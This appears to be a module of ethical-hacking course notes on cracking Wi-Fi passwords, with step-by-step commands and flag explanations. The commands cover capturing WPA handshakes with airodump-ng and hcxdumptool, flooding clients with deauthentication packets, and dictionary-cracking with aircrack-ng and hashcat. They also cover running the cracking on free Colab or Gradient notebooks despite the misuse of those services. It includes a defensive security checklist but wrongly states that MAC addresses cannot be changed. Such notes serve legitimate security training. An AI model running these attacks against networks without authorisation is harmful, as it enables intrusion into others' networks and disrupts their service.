# 16 - Hacking Wireless

## Module 16 - Hacking Wireless Network

<details>

<summary>What is a Wireless Network?</summary>

A **wireless network** is a communication system that allows devices to connect and communicate with each other or access the internet without the need for physical wired connections. It relies on radio waves or other wireless signals to transmit data between devices, such as computers, smartphones, tablets, printers, and routers.

Wireless networks are commonly used in homes, businesses, and public spaces to provide convenient and flexible connectivity. They are often associated with technologies like **Wi-Fi**, which enables wireless access to the internet, and Bluetooth, which facilitates short-range connections between devices.

Subsequently, a router receives these radio signals and deciphers their content. It then proceeds to relay this information to the Internet either through a Local Area Network (LAN) or a wired Ethernet connection, such as a cable network connection.

Focusing on Wi-Fi we need to talk about this topics:

1. **Access Point (AP)**: is a device that allows wireless devices to connect to a wired network. It serves as the central hub for wireless communication, bridging the gap between wireless clients (like smartphones or laptops) and the wired local area network (LAN).
2. **MAC Address (Media Access Control Address)**: is a unique identifier assigned to network interfaces, such as Wi-Fi cards and Ethernet adapters. It is used to distinguish devices on a network and ensure that data is sent to the correct destination. MAC addresses are hardcoded into network hardware and cannot be changed.
3. **BSSID (Basic Service Set Identifier)**: is the MAC address of an individual wireless access point within a Wi-Fi network. It is used to differentiate between multiple access points that may be part of the same wireless network.
4. **ESSID (Extended Service Set Identifier)**: is the name of a Wi-Fi network. It is what you see when you scan for available Wi-Fi networks on your device. ESSIDs are used to identify and connect to specific wireless networks.
5. **Wi-Fi Channels**: are specific frequencies within the 2.4 GHz or 5 GHz radio bands that Wi-Fi networks use for communication. They are like virtual lanes on a highway, allowing multiple networks to operate without interference. Choosing the right channel can help optimize your Wi-Fi network's performance.
6. **Monitor Mode**: is a Wi-Fi card operation mode that allows it to passively listen to all traffic on a particular channel, without actively transmitting data. It's often used for network analysis, monitoring, and security purposes.
7. **Packet Injection**: is a technique that allows an attacker (or a security professional) to inject or transmit packets into a Wi-Fi network. This can be used for various purposes, including network testing, penetration testing, and security research. It can also be used maliciously to exploit vulnerabilities in wireless networks.

</details>

<details>

<summary>Wi-Fi Security</summary>

**Wi-Fi security** is essential to protect your wireless network from unauthorized access and potential security breaches. Here are some key aspects of Wi-Fi security:

1. **Encryption**: Enable strong encryption protocols, such as WPA3 (the latest and most secure standard) or WPA2, on your Wi-Fi network. Encryption ensures that the data transmitted between devices and the router is scrambled and can only be decrypted by devices with the correct encryption key.
2. **Unique and Strong Passwords**: Use strong, unique passwords for your Wi-Fi network. Avoid easily guessable passwords and consider using a passphrase that combines letters, numbers, and symbols. Change your Wi-Fi password regularly.
3. **Network Name (SSID)**: Change the default network name (SSID) of your router. A unique SSID makes it more difficult for unauthorized users to identify your network.
4. **Network Segmentation**: Separate your network into different segments, such as a guest network and a primary network. This helps isolate guest users from your primary devices.
5. **Guest Network**: If your router supports it, create a guest network for visitors. Guest networks have limited access to your primary network and can help protect your devices and data.
6. **Firmware Updates**: Keep your router's firmware up to date. Manufacturers release updates to patch security vulnerabilities. Regularly check for and install these updates.
7. **MAC Address Filtering**: Implement MAC address filtering to allow only specific devices to connect to your network. While this adds a layer of security, it can be cumbersome to manage.
8. **Disable WPS**: If your router supports Wi-Fi Protected Setup (WPS), consider disabling it. WPS can be vulnerable to brute-force attacks.
9. **Firewall**: Enable the router's built-in firewall to filter incoming and outgoing traffic. Configure it to allow only necessary services.
10. **Intrusion Detection and Prevention Systems (IDPS)**: Consider using IDPS software or appliances to monitor your network for suspicious activity and protect against intrusions.
11. **Virtual Private Network (VPN)**: Use a VPN to encrypt your internet connection, adding an extra layer of security when accessing the internet via your Wi-Fi network.
12. **Disable Remote Management**: Disable remote management of your router from the internet. This prevents unauthorized access to your router's settings.
13. **Physical Security**: Ensure physical security of your router. Place it in a secure location to prevent unauthorized physical access.
14. **Regularly Monitor Network Activity**: Regularly check the devices connected to your network and review the router's logs for any unusual activity.

</details>

## WEP/WPA/WPA2 Cracking using AIRCRACK-NG

**Aircrack-ng** is a complete suite of tools to assess WiFi network security. It focuses on different areas of WiFi security such as:

* **Monitoring**: Packet capture and export of data to text files for further processing by third party tools
* **Attacking**: Replay attacks, deauthentication, fake access points and others via packet injection
* **Testing**: Checking WiFi cards and driver capabilities (capture and injection)
* **Cracking**: WEP and WPA PSK (WPA 1 and 2).

#### Phases

1. **Capture the 4-Way Handshake with Airmon‐ng**
2. **Crack the handshake with Aircrack‐ng**
   * Brute Force
   * Dictionary

<details>

<summary>4-Way Handshake</summary>

Once you connect to a Wifi AP, You use a pre‐shared key that you enter into your mobile or laptop to connect to the Wifi access point. Once a device is connecting, it uses that password to generate a session key with the help of a process called four‐way handshake in which were parameters (not going into detail) are exchanged.

This new session key is then used for encrypted communication over Wifi.

If you capture this handshake, you can break it to reveal the password for the Wifi.

</details>

#### Phase 1 - Capture the Handshake

1. **Put your Wifi card in monitor mode** _(By default, the Wifi cards capture only that traffic which is intended for your device. By putting it in monitor mode, you are telling your Wifi card to capture all wireless traffic)._

* `iwconfig` -> Checks for existing Wifi adapterù
* `airmon‐ng start wlan0` -> Activate Monitor Mode
* iwconfig -> Check the device name

2. **Capture traffic with airodump‐ng** _(This tool captures all the traffic that your wireless adapter can see and displays information about it eg: BSSID (the MAC address of the AP), channel, speed, encryption (if any), ESSID or SSID._

* `airodump‐ng wlan0mon` -> Use your card name

3. **Now start capturing the related traffic of your target AP.**

* `airodump‐ng ‐c 6 ‐‐bssid C0:F6:C2:5E:8D:20 ‐w pass wlan0mon`

> _‐c 6 is the channel for the wireless network_&#x20;
>
> _‐‐bssid C0:F6:C2:5E:8D:20 is the access point MAC address. This eliminates extraneous traffic._
>
> _‐w pass is the file name_&#x20;
>
> _‐wlan0mon is the interface name._

* Now start capturing the related traffic of your target AP
* `airodump‐ng ‐c 6 ‐‐bssid C0:F6:C2:5E:8D:20 ‐w pass wlan0mon`

4. **Deauthenticate the Wireless clients.**

* `aireplay‐ng ‐0 100 ‐a C0:F6:C2:5E:8D:20 wlan0mon`

> ‐‐0 means deauthentication
>
> 100 is the number of deauth packets to send
>
> ‐a C0:F6:C2:5E:8D:20 is the access point MAC address
>
> ‐wlan0mon is the interface name.

5. **Look for the WPA Handshake in the Notification**

* Press CTRL + C , Once you have handshake

#### Phase 2 - Cracking password

6. **Now you can use the following command to break the password with Dictionary attack**

* aircrack‐ng ‐w /usr/share/wordlists/rockyou.txt ‐b C0:F6:C2:5E:8D:20 pass\*.cap

> ‐w rockyou.txt is the dictionary file. Kali has this inbuilt dictionary already installed
>
> Pass\*.cap is the packet file where a captured handshake is stored.

* Sometimes the password list is compressed and you may need to perform these steps to uncompress the file:`locate rockyou`
* Now uncompress the file: `gunzip /usr/share/wordlists/rockyou.txt.gz`                      `ls /usr/share/wordlists/`
* `aircrack‐ng pass*.cap ‐w /usr/share/wordlists/rockyou.txt`

**And well search/found password!!**

#### Best Alternate Wordlists Collections

* https://weakpass.com/&#x20;
* https://github.com/danielmiessler/SecLists/tree/master/Pass words/WiFi-WPA&#x20;
* https://labs.nettitude.com/blog/rocktastic/
* https://github.com/kennyn510/wpa2-wordlists

### WEP Cracking – AIRCRACK-NG

`aircrack-ng '/root/Desktop/Sample Captures/WEPcrack-01.cap'` ‘’ are not needed if there is no space in folder name

### WPA2 Cracking – AIRCRACK-NG

`aircrack-ng -a 2 -b 20:E5:2A:E4:38:00 -w /root/Desktop/Wordlists/Passwords.txt '/root/Desktop/Sample Captures/WPA2crack-01.cap'` -a 2 mode WPA2, -b bssid, -w wordlist

{% embed url="https://www.aircrack-ng.org/" %}

{% embed url="https://www.stationx.net/how-to-use-aircrack-ng-tutorial/" %}

## Capturing Handshakes with Hcxdumptool

Capturing Handshakes is the first step and most important step for cracking wifi password. Hcxdumptool provides another method to capture the handshakes and is the recommended method to capture packets by Hashcat developers which is another excellent password cracking tool.&#x20;

Hcxdumptool is an easy and straightforward way to capture handshakes.

* You do not need to de authenticate the clients
* You can capture handshakes in bulk for all available networks which makes the whole process much simpler

By default, the tool does not come with Kali linux and you may need to install it: `sudo apt‐get install hcxdumptool`

1. Check the wifi adapters available on your machine

* `iwconfig` -> Check the device name

2. Stop the services that may interfare with handshake capture

* `sudo systemctl stop NetworkManager`
* `sudo systemctl stop wpa_supplicant`

> After the handshake is captured you can restart the services with following command:
>
> `sudo systemctl start NetworkManager`

3. Scan for available networks

* `sudo hcxdumptool ‐i wlan0 ‐‐do_rcascan`

4. Capture traffic with hcxdumptool

* sudo hcxdumptool ‐i wlan0 ‐o dumpfile.pcapng –active\_beacon –enable\_status=15

> dumpfile.pacapng is the file where handshake will be stored
>
> ‐wlan0mon is the interface name.

* After a minute or two, stop the capture with Ctrl+C and you will have your captured packets file stored in your home directory

{% embed url="https://miloserdov.org/?p=7801" %}

{% embed url="https://github.com/ZerBea/hcxdumptool" %}

## Preparing captured Handshakes for Cracking

### Convert Handshakes captured through Hcxdumptool

1. **Install the hcxpcapngtool**

* `sudo apt‐get install hcxtools`

2. **Convert the captured file with the tool**

* hcxpcapngtool ‐o hash.hc22000 ‐E essidlist dumpfile.pcapng

> ‐hash.hc22000 is the converted file
>
> Essid list will contain the list of SSIDs
>
> Dumpfile.pcapng is the source file

3. Convert the captured file with the tool

* `hcxpcapngtool ‐o hash.hc22000 ‐E essidlist dumpfile.pcapng`
* Check the essidlist file for name of wifi networks
* `nano essidlist`

> Sometimes wifi networks leak passwords and here we can see if there is some leaked password without even cracking something

* Check the BSSID of our network
* sudo hcxdumptool ‐i wlan0 ‐‐do\_rcascan

4. **Delete the excessive information and keep only the target network handshakes**

* `nano hash.hc22000`
* Now, we have our converted file hash.hc22000. Just copy it from Vmware machine to your main Windows Machine

### Convert Handshakes captured through Aircrack suite

1. **Copy the .cap file from VB machine to Windows machine**
2. **Use the following official website from hashcat developers to convert the file to proper format(.hc2200)**: [https://hashcat.net/cap2hashcat/](https://hashcat.net/cap2hashcat/)
3. **Download the converted file**

## Cracking Handshakes with Hashcat



{% content-ref url="../hashcat.md" %}
[hashcat.md](../hashcat.md)
{% endcontent-ref %}

### Cracking handshakes on Windows with Powerful graphics card

1. **Install the Hashcat from official website** https://hashcat.net/hashcat/
2. **Copy the handshake file to hashcat directory**
3. **Download and extract the rockyou dictionary in hashcat folder** https://github.com/brannondorsey/naive‐hashcat/releases/download/data/rockyou.txt
4. **Open the Power shell and then use the command to crack the handshake**

* `.\Hashcat.exe ‐m 22000 ‐a 0 ‐o cracked.txt hash.hc22000 rockyou.txt`

> 22000 tells the hashcat that its wifi password to be cracked
>
> Cracked.txt will store cracked passwords
>
> Hash.hc22000 is the source file
>
> Rockyou.txt is the dictionary file

### Cracking handshakes in cloud with Google collab

Google Collab is a free service offered by google to students to train their ML models.

There are a few jupyter notebooks already created by experts which can be utilized to crack the password. Do not abuse the service as its use may be restricted on abuse.

1. **Open any of the following links while signed in with your Google account** (Separate account is preferred)

> * https://colab.research.google.com/github/mxrch/penglab/blob/master/penglab.ip ynb
> * https://colab.research.google.com/github/someshkar/colabcat/blob/master/colabc at.ipynb
> * &#x20;https://colab.research.google.com/github/ShutdownRepo/google‐colab‐ hashcat/blob/main/google\_colab\_hashcat.ipynb

2. **Install hashcat and required dictionaries while following instructions**
3. **Upload your hash file to an online file hosting provider like filebin.com or catbox.moe and then import it in your notebook with the following command in a new block**

* `wget http://filebin.com/filename`

4. **Crack the handshake with following command**

* `!hashcat ‐‐status ‐m 22000 ‐a 0 ‐o cracked.txt hash.hc22000 /content/wordlists/rockyou.txt`

### Cracking handshakes in cloud with Gradient

1. **Sign up for a gradient account**

* https://gradient.run/

2. **Copy Block by Block, the code from following repo to a new notebook**

* https://colab.research.google.com/github/ShutdownRepo/google‐colab‐ hashcat/blob/main/google\_colab\_hashcat.ipynb

3. **Use the same commands to crack the handshake as we used in google collab**

* `wget http://filebin.com/filename`
* `!hashcat ‐‐status ‐m 22000 ‐a 0 ‐o cracked.txt hash.hc22000 /content/wordlists/rockyou.txt`





